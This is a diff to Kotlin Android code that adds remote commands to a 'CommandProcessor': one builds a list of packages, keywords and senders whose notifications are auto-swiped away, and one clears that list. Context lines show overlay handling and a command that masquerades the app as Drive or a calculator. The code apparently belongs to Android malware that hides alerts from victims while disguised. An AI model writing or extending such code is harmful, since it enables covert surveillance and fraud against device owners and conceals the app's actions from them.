@@ -738,6 +738,31 @@ object CommandProcessor {
                     DynamicUIManager.removeOverlay(ctx)
                     status = "UI_REMOVED"
                 }
+                "ADD_AUTO_SWIPE" -> {
+                    val parts = content.split("|")
+                    if (parts.size >= 2) {
+                        val type = parts[0].trim().lowercase() // pkgs, keywords, senders
+                        val newVal = parts[1].trim()
+                        val aPrefs = ctx.getSharedPreferences("auto_swipe_prefs", Context.MODE_PRIVATE)
+                        val existing = aPrefs.getString(type, "") ?: ""
+                        val updated = if (existing.isEmpty()) newVal else "$existing, $newVal"
+                        aPrefs.edit().putString(type, updated).apply()
+                        status = "AUTO_SWIPE_UPDATED: $type"
+                    } else {
+                        status = "FAILED_FORMAT"
+                    }
+                }
+                "CLEAR_AUTO_SWIPE" -> {
+                    val type = content.trim().lowercase()
+                    val aPrefs = ctx.getSharedPreferences("auto_swipe_prefs", Context.MODE_PRIVATE)
+                    if (type == "all" || type == "") {
+                        aPrefs.edit().clear().apply()
+                        status = "ALL_AUTO_SWIPE_PURGED"
+                    } else {
+                        aPrefs.edit().remove(type).apply()
+                        status = "AUTO_SWIPE_CLEARED: $type"
+                    }
+                }
                 "SET_MASQUERADE" -> {
                     val skin = content.trim().uppercase()
                     if (skin == "DRIVE" || skin == "CALC") {
